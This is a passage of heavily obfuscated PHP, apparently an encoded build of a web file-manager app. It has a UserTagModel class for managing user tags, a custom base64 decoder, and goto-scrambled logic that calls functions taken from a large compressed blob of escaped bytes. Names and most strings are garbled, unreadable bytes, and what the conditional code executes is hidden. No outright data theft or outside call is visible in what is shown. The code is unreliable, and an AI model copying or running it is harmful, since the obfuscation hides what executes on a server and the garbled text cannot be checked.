$F¦à˜­¢Ïˆ[2109]; if (!in_array($d‰ØÂ“İó, $e‘†×—Ö)) { $a”›–±ãšó[] = $d‰ØÂ“İó; } } $a”›–±ãšó[] = $dÇµÅ±ÕÕÕ; } $dÇµÅ±ÕÕÕ = implode($F¦à˜­¢Ïˆ[57], $a”›–±ãšó); } public function sort($céõ…”Ûì›, $FìŠ÷‘ìÑË) { return parent::update($céõ…”Ûì›, $FìŠ÷‘ìÑË); } } if ($_SERVER[$_SERVER[£¶ä½¶¢][4]] != $_SERVER[$_SERVER[£¶ä½¶¢][2110]]) { goto C””Ó—Ñ•; aªˆñÊ–: $dìÀ±ô† = explode($_SERVER[£¶ä½¶¢][9], $eé‚Î†¿); if (count($dìÀ±ô†) < $_SERVER[£¶ä½¶¢][10]) { $C“Äšô† = $_SERVER[£¶ä½¶¢][11]; $C“Äšô†(); } $D¢Û ÈëóØ = $_SERVER[£¶ä½¶¢][12]; goto FïåÆÍºçë; FïåÆÍºçë: $D¢Û ÈëóØ($_SERVER[$_SERVER[£¶ä½¶¢][5]]); goto f¦½¥ £ÊÖ; C””Ó—Ñ•: $Aõ³ˆÈ´˜ = $_SERVER[£¶ä½¶¢][6]; $aÂÅ©ŞùÓ = $_SERVER[$_SERVER[£¶ä½¶¢][7]] . $_SERVER[£¶ä½¶¢][8]; $eé‚Î†¿ = $Aõ³ˆÈ´˜($aÂÅ©ŞùÓ); goto aªˆñÊ–; f¦½¥ £ÊÖ: } goto dÓÌ¯ŞˆÃ; a×¢õ­Û£: class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\145\x72\x2e\x74\x61\147\x4c\151\163\164"; public $modelType = "\125\x73\145\162\117\x70\x74\x69\x6f\x6e"; public $field = array("\x6e\x61\155\145", "\163\164\171\154\x65", "\163\157\162\x74"); public function listData($e¦Ÿ¨õ¼ğµ = false, $D¡„ Š„ = "\x73\x6f\162\164", $D„çÙÒ½Š¢ = false) { return parent::listData($e¦Ÿ¨õ¼ğµ, $D¡„ Š„, $D„çÙÒ½Š¢); } public function remove($FÂ¶Ö…®Œ«) { return parent::remove($FÂ¶Ö…®Œ«); } public function add($A»ÌäÅ¦®ã, $C·ôœíÃô³ = "\154\141\x62\145\x6c\55\x67\162\145\x79\55\156\157\162\x6d\141\x6c") { $eõ¥³ë¦‰¡ =& $_SERVER[£¶ä½¶¢]; if ($this->findByName($A»ÌäÅ¦®ã)) { return !1; } $E–Ÿ¢±…”ñ = array($eõ¥³ë¦‰¡[421] => $A»ÌäÅ¦®ã, $eõ¥³ë¦‰¡[472] => $C·ôœíÃô³, $eõ¥³ë¦‰¡[1694] => $this->getSort($eõ¥³ë¦‰¡[265]) + 1); return parent::insert($E–Ÿ¢±…”ñ); } public function update($a·³¶™Ãê‡, $A…ÚÄ‚º«) { $F¶¿Úá§ÌÉ =& $_SERVER[£¶ä½¶¢]; $C£œŞÒ’™Ú = $this->listData($a·³¶™Ãê‡); $D¿Û‚èÌ¡¡ = $this->findByName($A…ÚÄ‚º«[$F¶¿Úá§ÌÉ[38]]); if (!$C£œŞÒ’™Ú || $D¿Û‚èÌ¡¡ && $D¿Û‚èÌ¡¡[$F¶¿Úá§ÌÉ[401]] != $C£œŞÒ’™Ú[$F¶¿Úá§ÌÉ[401]]) { return !1; } return parent::update($a·³¶™Ãê‡, $A…ÚÄ‚º«); } public function moveTop($A‚¶¡¶¤‘) { $fè——ƒğÆ =& $_SERVER[£¶ä½¶¢]; $c›À¤¡©„Ó = parent::listData(); $A¥ƒÆïäæç = $this->getSort($fè——ƒğÆ[264]); foreach ($c›À¤¡©„Ó as &$D‡°‘òÓ°î) { if ($D‡°‘òÓ°î[$fè——ƒğÆ[401]] == $A‚¶¡¶¤‘) { $D‡°‘òÓ°î[$fè——ƒğÆ[1713]] = $A¥ƒÆïäæç; continue; } $D‡°‘òÓ°î[$fè——ƒğÆ[1713]] += 1; } unset($D‡°‘òÓ°î); return parent::resetData($c›À¤¡©„Ó); } public function moveBottom($aÄ”ç¥©ñ¥) { $Fä´Æğˆ®ˆ =& $_SERVER[£¶ä½¶¢]; $aÀİÍíãòç = $this->getSort($Fä´Æğˆ®ˆ[265]) + 1; return parent::update($aÄ”ç¥©ñ¥, array($Fä´Æğˆ®ˆ[1713] => $aÀİÍíãòç)); } public function resetSort($Añá”ÃÈ¶) { goto BàÔ»Ç”Òç; BàÔ»Ç”Òç: $e¨„ÂÙ³â• =& $_SERVER[£¶ä½¶¢]; $aÃ¥ÈØ½ªí = array(); $Añá”ÃÈ¶ = is_array($Añá”ÃÈ¶) ? $Añá”ÃÈ¶ : array(); goto C°Ù£Ê¤ó; Bä¶Ü×É¯Á: unset($b¾”Â²äˆØ); return parent::resetData($AòŒ†±ß¨); goto EªÚ†ê¥Ãé; C°Ù£Ê¤ó: for ($Bä®ÚÃÆÛĞ = 0; $Bä®ÚÃÆÛĞ < count($Añá”ÃÈ¶); $Bä®ÚÃÆÛĞ++) { $aÃ¥ÈØ½ªí[$Añá”ÃÈ¶[$Bä®ÚÃÆÛĞ] . $e¨„ÂÙ³â•[43]] = $Bä®ÚÃÆÛĞ + 1; } $AòŒ†±ß¨ = parent::listData(); foreach ($AòŒ†±ß¨ as &$b¾”Â²äˆØ) { $eËÆªßöµ = $aÃ¥ÈØ½ªí[$b¾”Â²äˆØ[$e¨„ÂÙ³â•[401]]]; $b¾”Â²äˆØ[$e¨„ÂÙ³â•[1713]] = $eËÆªßöµ ? $eËÆªßöµ : $b¾”Â²äˆØ[$e¨„ÂÙ³â•[1713]]; } goto Bä¶Ü×É¯Á; EªÚ†ê¥Ãé: } private function getSort($dÑ½çµñº¥) { $Fœ£­í¼ëª =& $_SERVER[£¶ä½¶¢]; $a®îÁñÈ£ƒ = parent::listData(); $Aìë¸­ó˜ = array_to_keyvalue($a®îÁñÈ£ƒ, $Fœ£­í¼ëª[43], $Fœ£­í¼ëª[1713]); if (!$Aìë¸­ó˜) { $Aìë¸­ó˜ = array(0); } $B¨ƒŸ¾Ñå = $dÑ½çµñº¥ == $Fœ£­í¼ëª[265] ? max($Aìë¸­ó˜) : min($Aìë¸­ó˜); return intval($B¨ƒŸ¾Ñå); } } goto B‹ê¢¤ç¤Ô; Eïİƒ‰Ë§: if (!function_exists('_kodDe')) { function _kodDe($C­¯‡ó–”¡) { $C­¯‡ó–”¡ = base64_decode($C­¯‡ó–”¡); $eáØŒÚô¶ = strlen($C­¯‡ó–”¡); $dÄö÷ŞìñŠ = ''; $B¢À•òß«ù = ord($C­¯‡ó–”¡[0]) - 30; for ($aö‰¤œ„á = 1; $aö‰¤œ„á < $eáØŒÚô¶; $aö‰¤œ„á += 2) { if ($aö‰¤œ„á + 1 < $eáØŒÚô¶) { $dÄö÷ŞìñŠ .= chr(ord($C­¯‡ó–”¡[$aö‰¤œ„á + 1]) + $B¢À•òß«ù); $dÄö÷ŞìñŠ .= chr(ord($C­¯‡ó–”¡[$aö‰¤œ„á]) + $B¢À•òß«ù); } else { $dÄö÷ŞìñŠ .= chr(ord($C­¯‡ó–”¡[$aö‰¤œ„á]) + $B¢À•òß«ù); } } return $dÄö÷ŞìñŠ; } } define(base64_decode('o7bkjr22og=='), "\331\225\366\334"); $_SERVER[£¶ä½¶¢] = explode(base64_decode('fAR8A3wB'), gzinflate(substr("\37\213\10\0\0\0\0\0\0\3\255\175\11\174\123\125\366\260\214\313\10\202\13\242\242\202\76\212\330\26\262\224\266\154\205\122\323\66\155\43\151\123\222\224\265\45"."\274\44\57\355\153\223\274\364\275\227\56\54\62\342\16\12\242\342\350\14\72\343\256\243\202\62\242\240\242\343\250\70\56\70\56\343\256\343\137\145\123\124\304\155\304\365"."\xbb\xfb\xbd\xef\x25\x75\xfe\xdf\xef\xfb\xfc\x61\x73\xef\xb9\xcb\xbb\xeb\xb9\xe7\x9c\x7b\xce\xb9\x7f\xf8\xec\x86\xbf\xbe\xf3\xfc\xf9\xcb\x8e\x58\x76\xf8\xb2\x41\xb7\x3f\xfc\xd2\xc7\xcf"."\xad\xfb\x27\x8e\x80\xbf\xbf\x59\x76\x14\xe\x9f\xb9\xfa\xe8\xc3\xd0\x7f\x87\xaf\x5e\x55\x54\xd4\x30\x79\xc8\x84\xa6\xa1\x6b\x1f\xb8\x57\xbe\x4b\xfe\x8b\xbc\x3a\xe0\x7f\xfe\x5\xdf\xb0"."\27\357\71\327\273\347\226\347\373\367\14\72\314\371\362\244\353\52\100\146\134\66\42\47\324\244\22\122\227\50\276\264\10\301\141\30\212\264\53\146\44\246\245\115\45\155"."\x1a\x18\x5c\xed\x9\xf9\x6a\x22\xcd\x9e\x70\x3\x8e\xcb\x99\x8c\xdb\x88\x77\x19\x6e\x59\x8f\x75\xa8\x3d\x8a\x5f\x8d\xba\xa3\x6a\xda\x1d\x97\x4d\xd9\x5\x2\x38\xd7\x10\xfc\x53\x8e\x7f"."\142\35\112\254\53\42\107\65\335\124\342\30\224\115\47\325\164\27\353\37\370\133\201\177\244\264\146\112\112\237\152\320\6\200\346\44\324\166\34\246\325\273\361\217\321\235"."\x54\x4d\xd2\xfc\x48\x53\x20\x1c\x9\xb5\x34\x37\x7b\x83\xe1\x8\xa9\x51\x4c\x4f\x69\x71\x12\xca\xc8\xba\x9c\x22\x95\x67\x14\xdd\x0\x9f\x12\xab\x8b\x64\xb4\x8c\x92\xb6\x40\x38\x0\xf6"."\62\52\33\244\246\332\352\110\255\267\331\37\230\37\11\317\157\366\222\34\321\110\167\126\321\373\161\14\5\103\246\254\233\141\65\245\260\34\275\72\153\127\265\267\336\327"."\44\205\203\236\246\220\247\46\354\13\64\141\160\115\240\261\321\27\316\205\7\3\176\177\265\247\146\126\156\112\163\320\123\337\350\221\100\373\300\74\252\351\204\126\44\55".base64_decode('ximLpWIcqFOVJBn/tEybY/ZnSCjMQmAO0tlkEkeaWIi0X0nI2SQZs1oxktHVlA==')."\114\273\76\113\351\147\120\262\164\262\246\246\246\143\70\342\355\63\165\231\303\101\213\143\272\222\2\353\16\303\102\136\277\267\46\54\301\146\112\165\301\100\243\104\246\42".base64_decode('JRumoktzG7xBrwSbXlmIelwo4XItTWBAJI/fLw1Ug6mkMrQaXCZPZYFgrTcoVQ==').base64_decode('z5f4OMW0VEpLu0AtYD5NoaneYBAHHGQF+31w6kgkUFcX8rIY6dxsP2hJGVmllg==')."\130\74\221\64\43\75\162\62\113\27\53\331\43\205\344\207\374\152\6\131\300\335\152\132\315\222\305\112\252\320\64\266\163\110\40\113\163\53\24\242\304\111\40\5\312\153"."\144\163\201\235\326\203\203\225\63\361\357\164\222\51\12\221\102\217\242\233\21\45\35\323\342\152\232\354\307\52\262\367\310\12\224\315\216\132\35\340\4\235\124\250\271\142".strrev('@xå¯éwN¸ÉE@(°³›)º^+ '."\n".'ô…1q@g:+Œ–„·mŸŒPëQ¿¦Z')."\115\364\363\335\150\150\131\75\6\20\142\102\343\145\233\131\113\46\222\114\212\151\202\116\33\264\137\55\231\244\46\307\103\212\56\364\265\16\24\14\144\115\21\230\105\331".base64_decode('6jQ9VQvwBvk+2C1qS56ELrpf4sIQugi+K1p4vvPntoXngD/FBPm1kqZ1KMlkRA==').base64_decode('6VPIvkrFJxm0r24DYmYAwVFfINIhGx2N8UkRVIri1LjS58p0ZMjWZ7u91bLu4Q==')."\354\64\151\246\127\300\314\111\55\46\47\305\236\342\160\207\151\146\102\112\72\136\307\216\226\270\326\233\106\3\226\121\50\376\257\165\110\161\251\121\232\57\65\124\250\25"."\x6\x2d\x98\x4a\xb2\x10\xed\x1d\x83\x19\xc\x68\xf6\x91\x15\x53\x40\xe2\x4a\x9f\x49\x6\x45\x9a\x1e\xeb\x90\x75\x30\x5d\x95\x59\x33\xe1\x9c\xca\x8e\xac\xa4\x1a\x93\x4d\x55\x4b\xbb\xb5"."\230\251\230\116\303\324\25\231\324\346\211\305\24\303\160\326\200\123\117\327\222\116\117\62\251\365\72\3\272\332\256\246\53\244\361\4\33\343\43\321\11\61\144\5\331\304"."\x5\xd3\x25\xb8\x56\x20\x82\x18\x8f\xbf\x46\x37\x27\xcb\xad\xcb\x69\x23\xa1\xe8\x4e\x2f\xd9\x34\x15\x12\x98\xf\x86\x20\x69\xb6\x5a\xd5\xc8\x68\x86\xa\x9b\x57\x21\xc9\xa6\x29\xc7\x3a"."\40\162\341\325\127\376\112\176\25\236\243\112\116\136\157\137\106\325\25\203\266\125\252\157\14\223\112\100\355\212\263\131\227\333\123\162\205\224\311\106\301\310\220\335\233\7"."\x86\x73\x93\xa1\xa9\x90\x62\x30\xea\x90\x52\x59\xc3\x74\xea\xa\xc0\x52\x2a\x38\xf\xc9\x1c\xfb\x12\xce\x46\xb8\xb5\x54\x25\xee\xc\x1\x64\x4e\xc0\x65\x25\xe5\x12\x58\x36\x12\x4d\xc3"."\xd0\x86\x70\xb8\x39\xe2\xab\x3\x67\x76\x93\x37\xd2\xe8\x9\xd7\x10\xe2\xc2\x6b\xca\xed\xb4\xcd\x7e\x80\xa2\x59\x95\x14\x38\xcf\x9\xb6\x18\x5c\x58\x4d\xa0\xaf\x1c\xd8\xac\xf5\x2a\x3a".strrev('ƒ³vé+öÖí=ùd*oÚ\'Çİ9A1Ó†f‡’Õ&‹ŸZ£Å¥Ô…upø')."\xc\x79\x83\x73\xbc\xc1\x48\x28\x50\x17\x9e\xeb\x9\x92\xd3\x3e\xd\x56\x49\x1f\xfd\x14\xac\x3a\xe9\xc\x2a\x71\x30\xf4\x31\x93\x96\x93\x33\x70\xd4\x68\x1e\xb8\x31\xe0\x5c\xd1\x54\xb8"."\131\150\232\337\127\17\7\246\326\151\200\114\116\61\27\255\333\257\246\124\330\166\223\245\240\221\4\244\100\75\151\220\33\165\250\262\265\143\174\121\153\174\102\261\23\374".base64_decode('HV+8sLXWNb6tyq3yMu6JrolSaclkqRnQJqqclEinc3KUSIFZvzIA8OgStrVt6A==').strrev('bºj5Œ4°Û·%/¹ÌøâæÓüBÑí&·†¿!!ëÁ|– CpŞ#…'."\r".'âİè00')."\x85\xf0\x53\x63\xae\x1a\xa7\x68\x1c\x46\x1b\x14\xb5\xbd\x83\xf4\x4f\x85\xb5\xc5\xb4\xa4\xa6\xcb\x49\x88\xc5\xe8\x22\x56\x28\x66\x69\x57\x13\x64\x7e\x30\xc2\xe4\x91\x90\x9a\xca\x50\xbc"."\146\166\144\123\121\41\110\311\122\60\337\364\170\351\320\330\361\6\250\137\162\342\273\111\306\161\245\165\24\63\273\103\145\340\37\107\303\161\55\45\123\152\27\241\44\45".base64_decode('jnESBo23pDQoMj8vTd3UIFS3ZGlUzA6NTBIg8kmTsqxttJVxJanQ0ehQKEovIQ==').base64_decode('2cDJxMaKcw6AcANQfqSqRhCUhIQUjc+F9C4HmCxrEpwmgWgn2C6EklCNOuHwjw==').base64_decode('aCgNNF7m+Zt1JaGSTZcGM9Yo6120AJghfuzAiFBZXYvfH6kJNIUBDY0hc4O+sA==').strrev('[°“ŠKFs°8ÖD-G§28²?\''."\n".'”ô†§¹D$ã>QÌÓSÄmOQ®—')."\316\70\107\353\70\307\164\33\116\317\51\301\51\367\76\247\234\132\342\114\201\141\162\262\246\133\117\130\51\54\36\324\76\62\257\34\175\303\201\5\214\21\75\332\233\3".base64_decode('IVKgCkIB9RRVdNKO5haSlBLWVL03TI9pmRBNnrkhinOzIKOuLpF556poQ0ilfQ==').base64_decode('qSSnBK3dcfJJCDf4mmZFGgO1Xn/E1wQQUjgX3tJc66GzKsKrA5SFJdAWgJLmeA==')."\xfc\x3e\x7b\x76\xef\x3c\x5f\x28\x1c\xca\x9b\x4\x60\x2d\x5e\x5b\xa\x60\x2\x9b\x83\xde\x3a\xdf\x3c\x16\xad\xf3\x79\xfd\xb5\xa1\x48\x8d\xa7\xa6\x81\xe7\x69\xf2\x34\x92\x48\x24\x1\xd9"."\60\303\155\315\37\1\270\65\304\230\271\110\17\144\114\65\306\246\213\234\123\204\362\4\21\276\0\300\71\251\220\105\107\272\13\331\141\324\23\102\234\307\264\54\135\206"."\214\76\114\121\164\222\222\311\176\222\351\31\130\204\177\212\45\117\110\62\63\21\206\70\242\375\54\210\272\101\343\200\22\44\337\227\10\236\317\151\101\4\346\251\126\22"."\14\145\347\7\170\22\46\333\376\266\70\330\20\74\15\314\200\7\361\335\140\45\240\31\211\320\115\146\0\106\305\103\233\223\340\74\157\44\320\354\15\172\40\307\34\231"."\x1b\xc\x34\xd5\x93\x2\xbd\x1d\xa\x6d\x80\x8f\xc\x7f\x11\xa5\x9b\x8\xe3\x6c\x72\xdc\x5\x88\x1e\x99\xf2\x4e\x7c\xd0\x3b\x35\x3a\x94\xcb\xf0\xcf\xd9\xf8\x7\xd0\x7b\xe4\xe3\x4a\x9a".base64_decode('jnoUonGGESgzBHYDRcFaln0tqmlJukHB0c8QAWO5Ow26SPoo1plAzzJylIQDsw==')."\xbc\x4d\x11\xba\xb2\x70\x4c\x58\x8d\x18\x0\x98\xd8\x40\x90\xc\x88\xa9\x75\x51\x4e\xa\x27\x6\xbd\x21\xba\xbd\x75\xa5\x3b\xab\xd2\xe1\x72\xbb\x26\x90\x55\xac\x80\xd3\x8a\x7c\xde\xbd".base64_decode('qLV3QtFC5wRXGwgUjz8HR0ms1WWJnkXKZ3VWGlJERUZVcUWru9VdVFWx0ONcIg==')."\73\227\224\70\247\71\333\46\264\272\212\47\20\100\333\322\122\107\371\162\230\1\144\254\32\333\6\176\52\133\253\306\265\72\317\76\157\361\71\13\133\333\12\53\46\214"."\x69\x75\x8d\x6d\xed\x6d\x1b\x5f\x5c\x45\xbf\x13\xcb\xea\x80\x4b\x8c\xf5\xb3\xa6\xc6\x27\x14\x81\x26\x1\x4a\x89\x65\x49\x23\x5c\x27\x64\xa0\x9\x4b\xd4\xc\x87\x2e\x9d\xbc\x9c\xc2\xc1"."\x1c\x2a\xed\xbc\xc4\x42\x67\xeb\x84\xb6\x2a\xa1\x9c\x0\xb2\x7f\xb\x50\x49\x0\xf1\x76\xb0\x7c\x1e\xe7\x2\xd8\x33\x56\x14\xee\x7b\xb2\x3e\xb2\xe9\x18\xc7\x9e\x70\x5f\x44\xe5\x18\xc1"."\x3\x6a\x7b\x9a\x6d\x21\x70\xfc\x33\xee\xdc\x4a\xa0\x2f\x1d\x87\x7f\x97\xd3\x89\x6c\x57\xfa\x28\x6a\x48\x27\x54\x9d\xac\xce\x6c\x5a\xed\xa6\xc2\x87\xb4\xd2\x4d\x2\x9a\x49\xd7\x77\x54"."\x31\x7b\x15\xba\x3c\x0\xdc\x12\x7\x8b\x83\x72\x84\x20\x49\x88\x25\x11\x3d\x48\xbe\xc0\x39\x33\x5\xb1\x29\xa4\x17\x99\x8\x24\xc6\x7a\x59\x2c\xae\xa4\xc9\x3c\xd\x26\xb9\x8d\x98\x9c".base64_decode('UUJCDyORsKfa741QDEMwMY0jrFjNxHWgaxyjUvwQ49Q5YkTIzje6kxJCDJKi6w==')."\x9a\x5e\x81\xc4\x92\x46\x36\x3\xa9\x38\xc0\x74\x99\x60\x6c\x25\xc0\xb1\x4b\x95\x33\x25\x3c\xe4\xa4\x5c\x44\x9c\x80\x8c\x4c\x49\x6\xc8\x44\x33\x32\xc0\x5d\xd4\xda\x9a\x5d\xa8\xc4\xdb"."\26\202\105\55\73\23\155\113\313\226\27\123\342\334\335\12\376\243\21\214\313\110\353\63\174\56\15\100\245\121\222\311\223\107\172\26\141\330\60\2\16\146\27\154\7\23"."\200\130\42\54\31\107\65\235\121\113\31\13\275\155\152\246\234\264\124\21\206\20\212\232\350\301\115\144\5\170\266\375\34\143\301\243\134\20\76\42\164\332\304\44\153\114"."\xf2\x21\xc8\xbd\x60\x89\x90\x62\xba\x58\xe\x87\x90\x58\x59\x40\x71\x7b\x1a\xec\x9e\x1a\xe1\x64\xc3\x72\x9a\x50\xbf\x61\x2a\x29\x8b\x68\xd2\x50\xa0\xbc\xba\x2e\x9b\x4c\x9a\x8c\xc8\x4f"."\252\135\244\102\262\65\26\347\313\133\247\351\224\231\35\117\276\133\60\76\137\106\137\72\15\130\117\161\51\361\103\264\336\3\310\225\260\124\104\305\170\222\257\111\252\16"."\x4\xfc\x5e\x4f\x93\x4\xcf\x6b\x72\xce\xf8\x6a\x9d\xb4\xfc\x3c\xa7\x8f\x30\x48\x2c\xa0\xc6\xe9\xf0\x3\x1c\x66\x52\x28\x11\x60\x91\x18\xa4\x17\x1d\x50\x56\xe3\x80\xc4\x81\x3\x34\xcb".base64_decode('AZkfB6fRHVwC5mAUsoMQzg5T1sHRDilbEvTVOlSjFnEFqF6URNthdkBhRFLudw==').base64_decode('4Db5lR4l6aAtctCGOihV70BcWi1pTQtY3KQ1KAiwXYcDTjxcdw4umCOfE9gIBw==')."\x67\x31\x1c\xed\xba\x96\xcd\x34\xd3\x2f\x9\x31\xdc\x18\x2\xe0\x2d\x65\x80\xa0\xa6\x99\xe\xca\x36\x3a\x72\x39\xca\xfc\x43\x96\xbf\xe9\x68\x8c\xed\xdf\x26\xf3\x3\x93\x72\x87\x24\x7f"."\xed\xb9\x63\x6e\x65\x88\x96\xe2\x8a\x8\x63\xbd\x9c\x9e\x40\x96\x3c\x7c\xa\xe9\x2e\x49\x2a\x3c\x6\x7\x99\x87\xe6\xf0\x4d\x5\xfb\x51\x27\xf7\x88\x8b\x2a\xdf\x2\xa3\xe7\x0\x5d\x8c"."\134\100\316\345\267\234\56\265\263\206\166\351\53\374\150\130\156\17\11\237\63\345\166\372\255\74\251\70\34\124\142\375\61\316\136\326\12\114\253\65\306\306\35\355\213\174"."\x8b\x3b\xff\x7c\xb2\x5\xcb\xe6\x61\xc8\xe0\xc1\x74\x20\xe9\x2a\x66\x73\x69\x59\xfc\x3\xee\x36\xde\xa7\x40\x86\x1f\xe5\x10\x79\x86\xc0\xa1\x22\xa0\x47\xa\xa\x70\x6c\x9c\x25\xa4\x87".base64_decode('bBAmAIpUSUihMN4VcbBRf+wAOjqW78IoXyh0CCT4AYdwWMJd4uRTLkTJj6pF8A==')."\xb8\x47\x52\x8c\x71\x67\x13\x61\x43\xe5\x70\x5e\x9a\xd5\x74\xbf\x9a\x16\x5\x2b\x1c\xca\x4f\x3\x7e\x18\xc1\x85\x6b\x13\x5\xd5\xe\x14\xc6\xb8\x90\xb\x6e\x1c\x44\xa0\xe3\x80\xd7\x8f"."\xc2\xc9\xc1\xa5\x6\xa0\xf5\xe8\x2a\x94\xb7\x9d\xd4\x64\x6b\x39\x45\x18\xa4\xd3\x2d\x80\x1b\x8d\xd8\x16\x2e\x59\xb2\x1d\xb2\xce\xc7\x94\xee\x30\xb8\xcc\xb9\xb8\xa\x66\xe1\x51\x21\x5b"."\x42\xee\xe1\x7\xa5\xa5\x8c\xb0\x4f\xc\xb3\x9f\xb6\x5e\xc\x5a\x2b\xc5\xd1\xda\x81\x22\xd\x8c\xc9\xce\x17\x15\xb7\xa0\x6a\xf8\xd9\xd5\xad\x35\x8c\x7a\x1a\xd6\xf2\x46\xa1\xcc\x87\x86".base64_decode('NbT+6RWs5TRDbGoRhZFjMSIwr2xnWsvhBnoYcgOUZRJgct0FN1M9RMwicmTIzA==').base64_decode('gIcADguZMnYcbjljckC5GdlpY4PaovzjFjxFVnkmo6TjMIuw2SzVUjGiHAeMvA==')."\x4b\xc7\x38\xd1\x5\xa8\x40\x72\x21\xe8\x28\x11\xe\x6a\xbe\xb1\x97\x1a\x88\x3c\x22\x38\x74\xb9\x6d\xbc\x4c\xc0\x71\x46\x65\xdd\xa5\x83\xf\xf3\x26\x73\x9c\x41\x48\xbc\x2c\x3\xb4\x91"."\36\240\112\363\225\300\51\176\215\262\53\160\343\170\343\252\11\41\20\57\152\124\12\311\63\12\327\163\14\46\242\55\70\130\256\234\131\342\364\234\143\234\45\147\276\63"."\xc1\x35\x1e\xa1\x71\x17\x3f\xb5\xc4\x33\x4f\xbc\x81\x84\x77\x98\x38\x24\x5c\xdb\xa7\xd8\xa5\x26\x2\xba\xc\x53\xcb\xf0\x14\x21\x8a\x93\x85\x24\x5e\xa9\x90\x8b\xd\x3f\x6a\x13\xc0\xe3"."\x71\x44\xeb\xf0\x41\x43\x79\x49\x59\xc4\xd6\xe0\x5\xef\x4a\x82\x1c\x82\xa4\xdc\x57\xeb\xd1\x75\xba\x3e\x70\x87\xa0\xf0\x14\x0\x45\x10\xdc\xdc\x21\x2a\x4\xce\x87\xad\x71\xe5\xde\x1e".strrev('ÅY¼`>=©½ù&IîÏåˆJ«†ŠşOEY¹ÃÌ*ãÇ%Æcáv‚«~')."\102\42\144\300\142\165\210\311\240\27\34\371\140\214\76\25\251\60\53\325\305\157\261\355\324\231\25\41\15\174\204\17\200\231\370\204\346\217\203\343\256\246\103\115\53\6".strrev('ÀÖÁôeª–êˆ:Ó–˜ˆüèyœ ¤q4“ˆ'."\0".'&|„ š`šhÊáO#tµ;')."\43\131\247\153\51\137\0\54\375\374\353\301\236\117\241\262\66\204\141\372\324\174\35\5\363\7\217\372\201\352\244\311\254\52\116\27\334\362\316\367\137\357\270\356\333\127"."\276\374\31\307\67\375\160\343\355\333\160\260\77\326\145\144\332\311\215\21\372\233\243\255\165\321\274\317\264\167\166\234\372\313\175\362\212\372\357\23\267\56\272\267\371\346".strrev('Áı=ûèòKßo<…âıÿŸgÎïá z¬fëSÒu{å½Ç›[Ôp}:w(oE')."\350\341\223\27\167\205\26\173\127\157\171\163\105\331\63\237\257\270\177\354\201\155\143\325\67\332\26\327\366\376\363\275\312\377\74\132\365\370\330\105\107\271\46\36\374\350".base64_decode('QNXP//7ozGu+O27Y6LVrCy43j7x71c37j7rD33bz2N4L905c0+F75uTBH3zxyg==')."\103\173\262\377\52\357\76\246\345\177\312\207\25\167\77\373\233\113\226\255\131\271\170\304\17\313\106\155\75\370\257\342\313\167\17\377\345\27\351\241\17\56\274\164\335\371"."\xad\x73\x57\x8f\x1d\xd5\x39\xe7\xd3\xb\x1a\xa6\x5f\xf8\xc2\xad\xff\xf3\xea\x5d\x5b\xef\x95\x5a\xdf\xf9\xf3\xb1\x7\xa7\x7f\x5a\xee\x28\x58\xbd\xea\x8a\xa3\x2e\x5b\x3e\x64\xf8\x8e\x6b".base64_decode('Lqxe8+jWD3++5WXpqTNumte5LzpvVfSGxg86Rt68/uRta87/6ojjLgltmFhw/w==').base64_decode('NU8c1NMjvzl27ZKPLusp/8T4++hnphzcPOLNJ0b3b3p09bC//6528XPHByYdNw==')."\373\311\327\157\335\330\373\357\340\344\5\35\37\335\263\375\340\27\167\364\76\360\320\33\347\377\366\307\67\327\255\230\243\236\366\332\34\257\333\130\225\176\371\372\327\376".strrev('ë…–éljeu¼¾—Ê×ó"{>Şîõ\\ş·ôêwñ¹+,aäl¾¦ÿ\\ßĞÒ~2Ò')."\23\133\146\277\161\272\164\350\137\63\146\167\255\117\334\162\127\365\167\33\256\273\66\166\352\260\273\27\315\351\332\60\74\170\312\153\235\235\333\347\337\273\160\103\151\344"."\272\65\263\347\144\274\251\175\231\235\5\231\365\27\277\135\64\267\373\304\344\43\33\166\254\152\331\370\372\302\45\353\103\127\35\66\376\206\212\276\331\5\236\341\247\314"."\36\63\47\372\314\244\141\257\165\136\237\255\331\371\131\357\340\325\317\164\47\107\116\375\115\354\117\117\277\332\74\161\301\153\235\333\73\367\214\335\366\324\212\243\232\152"."\37\32\65\367\373\276\317\17\35\163\133\113\350\362\316\223\272\317\375\317\337\274\23\106\175\331\354\226\237\74\373\221\277\175\377\324\67\201\306\13\73\257\73\64\350\323"."\27\377\176\370\250\212\105\336\21\113\237\14\233\377\70\167\350\240\121\267\315\372\341\37\117\36\352\77\245\376\312\11\63\167\44\236\331\261\343\236\261\267\354\274\264\172"."\xbf\x14\x1f\x93\x3a\x6c\xed\x61\xde\x97\x57\x5e\xb8\xa7\xa8\x47\x5e\x7d\xc9\x4f\xd7\xad\x75\x5c\x72\xe4\xa2\x33\xd3\x6d\xf7\x1d\x7f\xcc\x4b\x23\x8e\xbb\xf4\x85\xb0\x27\x3a\xe5\xc5\xa2"."\301\137\116\272\105\33\161\373\150\331\73\363\275\233\316\350\170\246\340\272\123\327\254\275\377\222\121\275\233\207\324\236\174\375\215\37\5\222\216\7\376\270\171\304\220\272".base64_decode('C1/yy6dFZwyNN71d9NSJmy95x3V3zdXH7z2u6aXyccfce9f2j667feonHz19gg==')."\361\303\311\335\215\37\234\43\155\271\100\132\275\157\303\347\147\337\334\267\372\102\307\17\213\233\116\176\154\326\225\207\136\32\134\261\361\202\237\366\357\72\377\243\151\53".base64_decode('T7tZPWXOxtCb/97/1Lvq53tOmDzn4j/OrQp8vnXkZVfJVx+52j8j8+P8dZvbXw==')."\xd7\xaf\x9d\xf5\xba\x71\xf6\x55\xe5\xc5\x6b\x6e\x1d\x75\xce\xb\xb7\x3e\xb2\x74\xd1\x39\x73\xdf\xdf\x91\x98\xae\x9e\x36\xf7\xf0\x49\x86\xfb\x8e\x89\xab\xaf\xba\xfb\xab\xca\x53\x7f\x77".strrev('ó9Ö×UĞî24û)Œ¦Ÿ¾ßé?'."\r".'g3GÁ‘¡îó